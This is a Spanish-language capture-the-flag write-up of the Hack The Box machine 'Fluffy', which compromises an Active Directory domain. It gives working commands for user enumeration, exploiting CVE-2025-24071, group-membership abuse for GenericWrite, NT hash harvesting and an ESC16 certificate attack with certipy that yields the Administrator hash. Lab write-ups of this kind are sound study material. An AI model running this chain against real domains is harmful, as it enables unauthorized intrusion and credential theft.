
![image](Imágenes/20250526083423.png)


La máquina **Fluffy** de Hack The Box simula un entorno corporativo realista, en el que el atacante comienza con un acceso inicial proporcionado por el cliente, representado por un par de credenciales válidas. Este escenario reproduce una situación común en pentests internos, donde se parte con acceso limitado a la red o a una cuenta de bajo privilegio.


Esta máquina permite practicar múltiples técnicas comunes en entornos Active Directory con acceso inicial desde un usuario de bajo privilegio. A lo largo del compromiso se utilizan:

- **Enumeración interna** con usuario autenticado.
    
- **Acceso a recursos compartidos** según pertenencia a grupos.
    
- **CVE-2025-24071**
    
- **Abuso de privilegios ACL (`GenericWrite`)**.
    
- **ESC16**

---

# Enumeración inicial

## Escaneo de puertos

```nmap
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 13:45:46Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

 Nos acordamos de meter `10.10.11.69    fluffy.htb dc01.fluffy.htb` en el `/etc/hosts`.
## Usuarios

![image](Imágenes/20250526084912.png)

Y nos creamos con `enum4linux` un listado de usuarios.

```bash
enum4linux -U -u j.fleischman -p 'J0elTHEM4n1990!' fluffy.htb | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > usuarios.txt
```

![image](Imágenes/20250526085153.png)
## Políticas de Contraseñas

![image](Imágenes/20250526085253.png)

## Shares

![image](Imágenes/20250526085328.png)

Entramos en `IT` para ver que hay dentro:


![image](Imágenes/20250526085518.png)
Descargamos el `Upgrade_Notice.pdf` y vemos:


![image](Imágenes/20250526085620.png)

---
# Acceso

## Explotación de CVE

Utilizamos el  [CVE-2025-24071](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom/tree/main)

![image](Imágenes/20250526090358.png)

![image](Imágenes/20250526091132.png)

Ejecutamos `bloodhound-python` para ver posibles accesos:

```bash
bloodhound-python -u p.agila -p <p.agila psswd> -ns 10.10.11.69 -d fluffy.htb -c all --zip
```

![image](Imágenes/20250526165353.png)

Podemos ver tambien que si añadimos a `p.agila` al grupo `SERVICE ACCOUNTS` ganaremos privilegios de `GenericWrite`.

![image](Imágenes/20250526165856.png)

---
# Movimiento lateral y Escalada

Añadimos al usuario `p.agila` al grupo `SERVICE ACCOUNTS`:

```bash
bloodyAD --host dc01.fluffy.htb -u 'p.agila' -p <p.agila psswd> -d fluffy.htb add groupMember "SERVICE ACCOUNTS" p.agila
```
o
```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb"/"p.agila"%<p.agila psswd> -S "dc01.fluffy.htb"
```

Podemos ver que una vez conseguidos privilegios `GenericWrite`, somos capaces de adquirir los hashes NT de los diferentes usuarios del grupo:

![image](Imágenes/20250526172300.png)

Buscamos vulnerabilidades haciendo uso de los usuarios:

```bash
# solo a partir de versión 5.0.2 de certipy
certipy find -vulnerable -u ca_svc@fluffy.htb -hashes <NT hash> -stdout 
```

![image](Imágenes/20250526190917.png)

Pudiendo realizar ahora la escalada ESC16:

Modificamos primero el UPN de `ca_svc`:

```bash
certipy account -u 'p.agila@fluffy.htb' -p <p.agila psswd> -target 'dc01.fluffy.htb'  -upn 'administrator' -user 'ca_svc' update
```

Pedimos una plantilla de certificados:

```bash
certipy req -dc-ip '10.10.11.69' -u 'ca_svc@fluffy.htb' -hashes <NT hash> -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```

Restablecemos el UPN de `ca_svc`:

```bash
certipy account -u 'p.agila@fluffy.htb' -p <p.agila psswd> -target 'dc01.fluffy.htb' -upn 'ca_svc' -user 'ca_svc' update
```

Usamos el certificado para autenticarnos y conseguir el hash NTLM de `Administrator`:

```bash
certipy auth -pfx administrator.pfx -domain fluffy.htb
```

Ahora que poseemos el hash NTLM del usuario `Administrator`, podemos autenticarnos y coger las flags:

![image](Imágenes/20250526175438.png)

HAPPY HACKING

![image](Imágenes/20250526191638.png)
